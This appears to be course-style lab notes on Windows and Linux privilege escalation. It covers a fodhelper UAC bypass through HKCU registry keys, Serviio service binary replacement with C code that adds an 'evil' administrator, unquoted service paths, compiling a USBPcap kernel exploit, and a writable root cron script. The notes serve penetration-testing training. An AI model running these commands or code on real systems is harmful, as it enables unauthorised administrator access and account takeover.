• We will attempt to find and modify these registry keys in order to run a command of our choosing with high integrity.

 As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10 1709.
 
 We can leverage this to bypass UAC because of the way fodhelper interacts with the Windows Registry. 
 
 More specifically, it interacts with registry keys that can be modified without administrative privileges. 
 
 We will attempt to find and modify these registry keys in order to run acommand of our choosing with high integrity

We’ll begin our analysis by running the C:\Windows\System32\fodhelper.exe binary, whichpresents the Manage Optional Features settings pane:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/91.jpg)

•  In order to gather detailed information regarding the fod helper integrity level and the permissions required to run this process, we will inspect its application manifest.
 
•  The application manifest is an XML file containing information that lets the operating system know how to handle the program when it is started.
 
• We’ll inspect the manifest with the sigcheck utility from Sysinternals, passingthe -a argument to obtain extended information and -m to dump the manifest.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/92.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/93.jpg)

C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite

C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System3
2\fodhelper.exe

c:\windows\system32\fodhelper.exe:
 Verified: Signed
 Signing date: 4:40 AM 9/29/2017
 Publisher: Microsoft Windows
 Company: Microsoft Corporation
 Description: Features On Demand Helper
 Product: Microsoft« Windows« Operating System
 Prod version: 10.0.16299.15
 

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/94.jpg)

• A quick look at the results shows that the application is meant to be run by administrative users and as such, requires the full administrator access token.

• Additionally, the auto elevate flag is set to true, which allows the executable to auto-elevate to high integrity without prompting the administrator user for consent

• We can use Process Monitor from the Sysinternals suite to gather more information about this tool as it executes.

• Process Monitor is an invaluable tool when our goal is to understand how a specific process interacts with the file system and the Windows registry.
 
• It’s an excellent tool for identifying flaws such as Registry hijacking, DLL hijacking,and more.

• After starting procmon.exe, we’ll run fodhelper.exe again and set filters to specifically focus onthe activities performed by our target process.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/95.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/96.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/97.jpg)

• After starting procmon.exe, we’ll run fodhelper.exe again and set filters to specifically focus onthe activities performed by our target process.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/98.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/99.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/100.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/101.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/102.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/103.jpg)

 This filter significantly reduced the output but for this specific vulnerability, we are only interested in how this application interacts with the registry keys that can be modified by the current user. 
 
 To narrow our results, we will adjust the filter with a search for “Reg”, which Procmon uses to mark registry operations.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/104.jpg)

 Once our new filter has been added, we should only see results for registry operations. Figure shows Process Monitor reduced output as a result of our two filters.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/105.jpg)

• These are more manageable results but we want to further narrow our focus.

• Specifically, we want to see if the fodhelper application is attempting to access registry entries that do not exist. 

• If this is the case and the permissions of these registry keys allow it, we may be able to tamper with those entries and potentially interfere with actions the targeted high-integrity process is attempting to perform.

• To again narrow our search, we will rerun the application and add a “Result” filter for “NAME NOTFOUND”, an error message that indicates that the application is attempting to access a registry entry that does not exist.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/106.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/107.jpg)


The output reveals that fodhelper.exe does, in fact, generate the “NAME NOT FOUND” error, an indicator of a potentially exploitable registry entry.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/108.jpg)

• However, since we cannot arbitrarily modify registry entries in every hive, we need to focus on the registry hive we can control. 

• In this case, we will focus on the HKEY_CURRENT_USER (HKCU) hive,which we, the current user, have read and write access to

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/109.jpg)


Applying this additional filter produces the following results:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/110.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/111.jpg)
 	

• According to this output, we see something rather interesting.

• The fodhelper.exe application attempts to query the HKCU:\Software\Classes\ms-settings\shell\open\command registry key, which does not appear to exist.

• In order to better understand why this is happening and what exactly this registry key is used for,we’ll modify our check under the Path and look specifically for any access to entries that contain 
 ms-settings\shell\open\command.

• If the process can successfully access that key in some other hive, the results will provide us with more clues.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/112.jpg)

• This output contains an interesting result. When fodhelper does not find the ms settings\shell\open\command registry key in HKCU, it immediately tries to access the same key inthe HKEY_CLASSES_ROOT (HKCR) hive.

•  Since that entry does exist, the access is successful.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/113.jpg)


• If we search for HKCR:ms-settings\shell\open\command in the registry, we find a valid entry:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/114.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/115.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/116.jpg)





• Based on this observation, and after searching the MSDN documentation for this registry key format (application-name\shell\open), we can infer that fodhelper is opening a section of the Windows Settings application (likely the Manage Optional Features presented to the user when fodhelper is launched) 

• through the ms-settings: application protocol. An application protocol on
  Windows defines the executable to launch when a particular URL is used by a program. 
  
• These URL Application mappings can be defined through Registry entries similar to the ms-setting key we found in HKCR . 
  
• In this particular case, the application protocol schema for ms settings passes the execution to a COM  object rather than to a program.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/117.jpg)

  
• This can be done bysetting the Delegate Execute key value  to a specific COM class ID as detailed in the MSDN documentation. 


• This is definitely interesting because fodhelper tries to access the ms-setting registry key within the HKCU hive first. 
 
• Previous results from Process Monitor clearly showed that this key does not exist in HKCU, but we should have the necessary permissions to create it.
 
• This could allow us to hijack the execution through a properly formatted protocol handler. 
 
•  Let’s try to add this key with the REG utility:
 
 C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
The operation completed successfully.
C:\Users\admin>

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/118.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/119.jpg)
 
 add the result filter again.
 
 
 Once we have added the registry key, we will clear all the results from Process Monitor , restart fodhelper.exe, and monitor the process activity:
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/120.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/121.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/122.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/123.jpg)

 
 Please note that clearing the output display does NOT clear the filters we created.
 
 They are saved and we do not need to recreate them
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/124.jpg)
 
• The figure above shows that, this time, fodhelper.exe attempts to query a value(DelegateExecute) stored in our newly-created command key.
  
• This did not happen before we created our fake application protocol key. 
 
• However, since we do not want to hijack the execution through a COM object, we’ll add a Delegate Execute entry, leaving its value empty.
 
• Our hope is that when fodhelper discovers this empty value, it will follow the MSDN specifications for application protocols and will look for a program to launch specified in the Shell\Open\command\   Default keyentry

• We will use REG ADD with the /v argument to specify the value name and /t to specify the type:

C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v Delega
teExecute /t REG_SZ
The operation completed successfully.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/125.jpg)


• In order to verify that fodhelper successfully accesses the DelegateExecute entry we have just added, we will remove the “NAME NOT FOUND” filter and replace it with “SUCCESS” to show only successful operations and restart the process again:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/126.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/127.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/128.jpg)

• As expected, fodhelper finds the new DelegateExecute entry we added, but since its value is empty,it also looks for the (Default) entry value of the Shell\open\command registry key. 

• The (Default)entry value is created as null automatically when adding any registry key. 

• We will follow the application protocol specifications and replace the empty (Default) value with an executable of our choice, cmd.exe. 

• This should force fodhelper to handle the ms-settings: protocol with our own executable!.

• In order to test this theory, we’ll set our new registry value. We’ll also specify the new registry value with /d “cmd.exe” and /f to add the value silently.

C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.e
xe" /f
The operation completed successfully.

• After setting the value and running fodhelper.exe once again, we are presented with a command shell:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/129.jpg)


• The output of the whoami /groups command indicates that this is a high-integrity command shell.

• Next, we’ll attempt to change the admin password to see if we can successfully bypass UAC:

C:\Windows\system32> net user admin Ev!lpass
The command completed successfully.

• The password change is successful and we have successfully bypassed UAC!

• This attack not only demonstrates a terrific UAC bypass, but also reveals a process that we could use to discover similar bypasses.
18.2.3.2 Exercise

1. Log in to your Windows client as the admin user and attempt to bypass UAC using the application and technique covered above.
18.2.4 Insecure File Permissions: Serviio Case Study

18.2.4 Insecure File Permissions: Serviio Case Study

• a common way to elevate privileges on a Windows system is to exploitin secure file permissions on services that run as nt authority\system.
 
• For example, consider a scenario in which a software developer creates a program that runs as a Windows service.
 
• During the installation, the developer does not secure the permissions of the program, allowing full read and write access to all members of the Everyone group.
 
•  As a result,a lower-privileged user could replace the program with a malicious one. When the service is restarted or the machine is rebooted, the malicious file will be executed with SYSTEM privileges.
 
•  This type of vulnerability exists on our Windows client. 
• Let’s validate the vulnerability and exploit it.
 
• In one of the previous sections, we showed how to list running services with task list. Alternatively,we could use the PowerShell Get-WmiObject cmdlet with the win32_service WMI class.
 
•  In this example, we will pipe the output to Select-Object to display the fields we are interested in an duse Where-Object to display running services ({$_.State -like ‘Running’}):
 
 PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName
| Where-Object {$_.State -like 'Running'}
Name State PathName
---- ----- --------
AudioEndpointBuilder Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRes
Audiosrv Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRe
...
Power Running C:\Windows\system32\svchost.exe -k DcomLaunch
ProfSvc Running C:\Windows\system32\svchost.exe -k netsvcs
RpcEptMapper Running C:\Windows\system32\svchost.exe -k RPCSS
RpcSs Running C:\Windows\system32\svchost.exe -k rpcss
SamSs Running C:\Windows\system32\lsass.exe
Schedule Running C:\Windows\system32\svchost.exe -k netsvcs
SENS Running C:\Windows\system32\svchost.exe -k netsvcs
Serviio Running C:\Program Files\Serviio\bin\ServiioService.exe
ShellHWDetection Running C:\Windows\System32\svchost.exe -k netsvcs

 
 

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/130.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/131.jpg)

• Based on this output, the Serviio service stands out as it is installed in the Program Files directory.

• This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software.

• These circumstances make it more prone to this type of vulnerability.

• As a next step, we’ll enumerate the permissions on the target service with the icacls Windows utility. 

• This utility will output the service’s Security Identifiers (or SIDs) followed by a permission mask, which are defined in the icacls documentation.

•  The most relevant masks and permissionsare listed below:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/132.jpg)

• We can run icacls, passing the full service name as an argument. The command output willenumerate the associated permissions:

C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)
 NT AUTHORITY\SYSTEM:(I)(F)
 BUILTIN\Administrators:(I)(F)
APPLICATION PACKAGE AUTHORITY\ALL APPL
ICATION PACKAGES:(I)(RX)
Successfully processed 1 files; Failed processing 0 files


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/133.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/134.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/135.jpg)

• As suspected, the permissions associated with the ServiioService.exe executable are quite interesting. 

• Specifically, it appears that any user (BUILTIN\Users) on the system has full read and write access to it. This is a serious vulnerability

• In order to exploit this type of vulnerability, we can replace ServiioService.exe with our own malicious binary and then trigger it by restarting the service or rebooting the machine.

• We’ll demonstrate this attack with an example. The following C code will create a user named “evil”and add that user to the local Administrators group using the system529 function. 

• The compiledversion of this code will serve as our malicious binary:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/136.jpg)


#include <stdlib.h>
int main ()
{
 int i;

 i = system ("net user evil Ev!lpass /add");
 i = system ("net localgroup administrators evil /add");
  return 0;
}


• Next, we’ll cross-compilethe code on our Kali machine with i686-w64-mingw32-gcc, 
using -oto specify the name of the compiled executable:

kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/137.jpg)

We can transfer it to our target and replace the original ServiioService.exe binary with our malicious copy:

C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program F
iles\Serviio\bin\ServiioService_original.exe"
 1 file(s) moved.
C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
 1 file(s) moved.
C:\Users\student> dir "C:\Program Files\Serviio\bin\"
Volume in drive C has no label.
Volume Serial Number is 56B9-BB74
Directory of C:\Program Files\Serviio\bin
01/26/2018 07:21 AM <DIR> .
01/26/2018 07:21 AM <DIR> ..
12/04/2016 08:30 PM 867 serviio.bat
01/26/2018 07:19 AM 48,373 ServiioService.exe
12/04/2016 08:30 PM 10 ServiioService.exe.vmoptions
12/04/2016 08:30 PM 413,696 ServiioService_original.exe
 4 File(s) 462,946 bytes
 2 Dir(s) 3,826,667,520 bytes free
 

In order to execute the binary, we can attempt to restart the service.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/138.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/139.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/140.jpg)

C:\Users\student> net stop Serviio
System error 5 has occurred.
Access is denied.

restart the service with rebooting it.

• Unfortunately, it seems that we do not have enough privileges to stop the Serviio service.

•  This is expected as most services are managed by administrative users.

• Since we do not have permission to manually restart the service, we must consider another approach. 

• If the service is set to “Automatic”, we may be able to restart the service by rebooting the machine.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/141.jpg)

C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startm
ode
Caption Name StartMode State
Serviio Serviio Auto Running

• Let’s check the start options of the Serviio service with the help of the Windows Management Instrumentation Command-line.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/142.jpg)

C:\Users\student>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State
============================= ==================================== ========
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled


• This service will automatically start after a reboot. Now, let’s use the whoami command to determine if our current user has the rights to restart the system:

•  The listing above shows that our user has been granted shutdown privileges(SeShutdownPrivilege) (among others) and therefore we should be able to initiate a system shutdown or reboot.

•  Note that the Disabled state only indicates if the privilege is currently enabled for the running process. 

• In our case, it means that whoami has not requested, and hence is not currently using, the SeShutdownPrivilege privilege.

• If the SeShutdownPrivilege was not present, we would have to wait for the victim to manually start the service, which would be much less convenient for us.

• Let’s go ahead and reboot (/r) in zero seconds (/t 0):

C:\Users\student\Desktop> shutdown /r /t 0 


•  Now that the reboot is complete, we should be able to log in to the target machine using the username “evil” with a password of “Ev!lpass”. 

• After that, we can confirm that the evil user is partof the local Administrators group with the net localgroup command.

C:\Users\evil> net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the computer/domain
Members
admin
Administrator
corp\Domain Admins
corp\offsec
evil
The command completed successfully



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/143.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/144.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/145.jpg)


• Very Nice. We have used the insecure file permissions to replace the service program with our ownmalicious binary which, when run, granted us Administrative access to the system.




18.2.4.1 Exercises


1. Log in to your Windows client as an unprivileged user and attempt to elevate your privilegesto SYSTEM using the above vulnerability and technique.

2. Attempt to get a remote system shell rather than adding a malicious user
18.2.5 Leveraging Unquoted Service Paths


• cannot reproducable in dedicated student client.

• Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around un quoted service paths.

• We can use this attack when we have write permissions to a service’s main directory and sub directories but cannot replace files within them.

• Please note that this section of the module will not be re producible on your dedicated client.

• However, you will be able to use this technique on various hosts inside the lab environment.

• As we have seen in the previous section, each Windows service maps to an executable file that will be run when the service is started. 

• Most of the time, services that accompany third party software are stored under the 
 C:\Program Files directory, which contains a space character in its name. This can potentially be turned into an opportunity for a privilege escalation attack.

• When using file or directory paths that contain spaces, the developers should always ensure that they are enclosed by quotation marks.

•  This ensures that they are explicitly declared. 

• However,when that is not the case and a path name is un quoted, it is open to interpretation. 

• Specifically, in the case of executable paths, anything that comes after each white space character will be treated as a potential argument or option for the executable.

• For example, imagine that we have a service stored in a path such as 
  C:\Program Files\MyProgram\My Service\service.exe. 
 
• If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:

C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/146.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/147.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/148.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/149.jpg)

• if we execute in to folders My Service or My Program , we can execute it.

• In this example, Windows will search each “interpreted location” in an attempt to find a valid executable path. 

• In order to exploit this and subvert the original unquoted service call, we must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and name it so that it also matches the interpreted filename. 

• Then, when the service runs, it should execute our file with the same privileges that the service starts as. 

• Often, this happens to be the NT\SYSTEM account, which results in a successful privilege escalation attack.

• For example, we could name our executable Program.exe and place it in C:\, or name it My.exe and place it in C:\Program Files. 

• However, this would require some unlikely write permissions since standard users do not have write access to these directories by default.


• It is more likely that the software’s main directory (C:\Program Files\My Program in our example)or subdirectory (C:\Program Files\My Program\My service) is misconfigured, allowing us to planta malicious My.exe binary.

• Although this vulnerability requires a specific combination of requirements, it is easily exploitable and a privilege escalation attack vector worth considering.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/150.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/151.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/152.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/153.jpg)

18.2.6 Windows Kernel Vulnerabilities: USBPcap Case Study

not reproducable.

•  In the previous fodhelper.exe example, we leveraged an application-based vulnerability to bypass UAC. 
 
•  In this section, we will demonstrate a privilege escalation that relies on a kernel driver vulnerability. 
 
•  Once again, this section of the module will not be reproducible on your dedicated client, but you will be able to use this technique against various hosts inside the lab environment


• When attempting to exploit system-level software (such as drivers or the kernel it self), we must pay careful attention to several factors including the target’s operating system, version, and architecture.

• Failure to accurately identify these factors can trigger a Blue Screen of Death(BSOD) while running the exploit.

•  This can adversely affect the client’s production system and deny us access to a potentially valuable target.

• Considering the level of care we must take, in the following example we will first determine theversion and architecture of the target operating system.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/154.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/155.jpg)

C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1 Build 7601
System Type: X86-based PC

• The output of the command reveals that our target is running Windows 7 SP1 on an x86 processor.

• At this point, we could attempt to locate a native kernel vulnerability for Windows 7 SP1 x86 and use it to elevate our privileges.

• However, third-party driver exploits are more common.
• As such, we should always attempt to investigate this attack surface first before resorting to more difficult attacks.

• To do this, we’ll first enumerate the drivers that are installed on the system:

C:\Users\student\Desktop>driverquery /v
Module Name Display Name Description Driver Type Start M
ode State Status Accept Stop Accept Pause Paged Pool Code(bytes BSS(by
Link Date Path Init(byt
es
============ ====================== ====================== ============= =======
=== ========== ========== =========== ============ ========== ========== ======
====================== ================================================ ========
==
ACPI Microsoft ACPI Driver Microsoft ACPI Driver Kernel Boot
 Running OK TRUE FALSE 77,824 143,360 0
11/20/2010 12:37:52 AM C:\Windows\system32\drivers\ACPI.sys 8,192
...
USBPcap USBPcap Capture Servic USBPcap Capture Servic Kernel Manual
 Stopped OK FALSE FALSE 7,040 9,600 0
10/2/2015 2:08:15 AM C:\Windows\system32\DRIVERS\USBPcap.sys 2,176
...

• The output primarily consists of typical Microsoft-installed drivers and a very limited number of third party drivers such as USBPcap.

• It’s important to note that even though this driver is marked as stopped, we may still be able to interact with it, as it is still loaded in the kernel memory space.

• Since Microsoft-installed drivers have a rather rigorous patch cycle, third-party drivers often present a more tempting attack surface. 

• For example, let’s search for USBPcap in the Exploit Database:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/156.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/157.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/158.jpg)

kali@kali:~# searchsploit USBPcap
--------------------------------------- ----------------------------------------
Exploit Title | Path
 | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
USBPcap 1.1.0.0 (WireShark 2.2.5) - Lo | exploits/windows/local/41542.c
--------------------------------------- --------------------------------


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/159.jpg)

•  The output reports that there is one exploit available for USBPcap. 

• As shown in Listing , this particular exploit targets our operating system version, patch level, and architecture. 

• However, it depends on a particular version of the driver, namely USBPcap version 1.1.0.0, which is installedalong with Wireshark 2.2.5.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/160.jpg)

Exploit Title - USBPcap Null Pointer Dereference Privilege Escalation
Date - 07th March 2017
Discovered by - Parvez Anwar (@parvezghh)
Vendor Homepage - http://desowin.org/usbpcap/
Tested Version - 1.1.0.0 (USB Packet cap for Windows bundled with WireShark 2.2.5)
Driver Version - 1.1.0.0 - USBPcap.sys
Tested on OS - 32bit Windows 7 SP1
CVE ID - CVE-2017-6178
Vendor fix url - not yet
Fixed Version - 0day
Fixed driver ver - 0day
...


Let’s take a look at our target system to see if that particular version of the driver is installed.To begin, we will list the contents of the Program Files directory, in search of the USBPcap directory:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/161.jpg)

C:\Users\n00b> cd "C:\Program Files"
C:\Program Files> dir
...
08/13/2015 04:04 PM <DIR> MSBuild
07/14/2009 06:52 AM <DIR> Reference Assemblies
01/24/2018 02:30 AM <DIR> USBPcap
12/22/2017 04:11 PM <DIR> VMware
04/12/2011 04:16 AM <DIR> Windows Defender


 As we can see, there is a USBPcap directory in C:\Program Files.
 
• However, keep in mind that the driver directory is often found under 
 C:\Windows\System32\DRIVERS. 
 
• Let’s inspect the contents of USBPcap.inf to learn more about the driver version:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/162.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/163.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/164.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/165.jpg)

C:\Program Files\USBPcap> type USBPcap.inf
[Version]
Signature = "$WINDOWS NT$"
Class = USB
ClassGuid = {36FC9E60-C465-11CF-8056-444553540000}
DriverPackageType = ClassFilter
Provider = %PROVIDER%
CatalogFile.NTx86 = USBPcapx86.cat
CatalogFile.NTamd64 = USBPcapamd64.cat
DriverVer=10/02/2015,1.1.0.0
[DestinationDirs]
DefaultDestDir = 12
...


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/166.jpg)

•Based on the version information, our driver should be vulnerable.
•Before we try to exploit it, we firsthave to compile the exploit since it’s written in C.


18.2.6.1 Compiling C/C++ Code on Windows

• The vast majority of exploits targeting kernel-level vulnerabilities (including the one we have selected) are written in a low-level programming language such as C or C++ and therefore require compilation. 

• Ideally, we would compile the code on the platform version it is intended to run on.

•  In those cases, we would simply create a virtual machine that matches our target and compile the code there. 

• However, we can also cross-compile the code on an operating system entirely different from the one we are targeting. 

• For example, we could compile a Windows binary on our Kali system.

• For the purposes of this module however, we will use Mingw-w64,538 which provides us with the GCC compiler on Windows.

• Since our Windows client has Mingw-w64 pre-installed, we can run the mingw-w64.bat script that sets up the PATH environment variable for the gcc executable.

• Once the script is finished, we canexecute gcc.exe to confirm that everything is working properly:

C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1>echo off
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.
C:\> gcc
gcc: fatal error: no input files
compilation terminated.
C:\> gcc --help
Usage: gcc [options] file...
Options:
 -pass-exit-codes Exit with highest error code from a phase.
 --help Display this information.
 --target-help Display target specific command line options.
 --help={common|optimizers|params|target|warnings|[^]{joined|separate|undocumented}}[
 Display specific types of command line options.
 (Use '-v --help' to display command line options of sub-processes).
 --version Display compiler version information.

• The compiler seems to be working.

•  Now let’s transfer the exploit code to our Windows client and attempt to compile it.

•  Since the author did not mention any particular compilation options, we will try to run gcc without any arguments other than specifying the output file name with -o:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/167.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/168.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/169.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/170.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/171.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/172.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/173.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/174.jpg)

• Despite two warning messages, the exploit compiled successfully and gcc created the exploit.exe executable. 

• If the process had generated an error message, the compilation would have aborted and we would have to attempt to fix the exploit code and recompile it.

• Now that we have compiled our exploit, we can transfer it to our target machine and attempt to run it.

•  In order to determine if our privilege escalation was successful, we can use the whoami command before and after running our exploit:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/175.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/176.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/177.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/178.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/179.jpg)

• Great! We have successfully elevated our privileges from admin-pc\n00b to nt authority\system, which is the Windows account with the highest privilege level.

18.3 Linux Privilege Escalation Examples

18.3 Linux Privilege Escalation Examples
18.3.1 Understanding Linux Privileges

18.3.1 Understanding Linux Privileges

• One of the defining features of Linux and other UNIX derivatives is that most resources, including files, directories, devices, and even network communications are represented in the file system.

• Put colloquially, “everything is a file”. Every file (and by extension every element of a Linux system) abides by user and group permissions based on three primary abilities: read, write, and execute
18.3.2 Insecure File Permissions: Cron Case Study


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/180.jpg)

• As we turn our attention to privilege escalation techniques, we will first leverage insecure file permissions.
 
• As with our Windows examples, we will assume that we have already gained access to our Linux target machine as an unprivileged user.
 
• In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level.
 
• On a Linux system, the cron time based job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.
 
• For the purpose of this example, we will SSH to our dedicated Debian client.
 
• In a previous section,we showed where to look on the filesystem for installed cron jobs on a target system. 
 
• We could also inspect the cron log file (/var/log/cron.log) for running cron jobs:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/181.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/182.jpg)

• this cron job is scheduled for every five minutes to run AS A ROOT user

student@debian:~$ grep "CRON" /var/log/cron.log
Jan27 15:55:26 victim cron[719]: (CRON) INFO (pidfile fd = 3)
Jan27 15:55:26 victim cron[719]: (CRON) INFO (Running @reboot jobs)
...
Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/18/183.jpg)

student@debian:~$ cat /var/scripts/user_backups.sh
#!/bin/bash
cp -rf /home/student/ /var/backups/student/
student@debian:~$ ls -lah /var/scripts/user_backups.sh
-rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh

• It appears that a script called user_backups.sh under /var/scripts/ is executed in the context of the root user. 
 
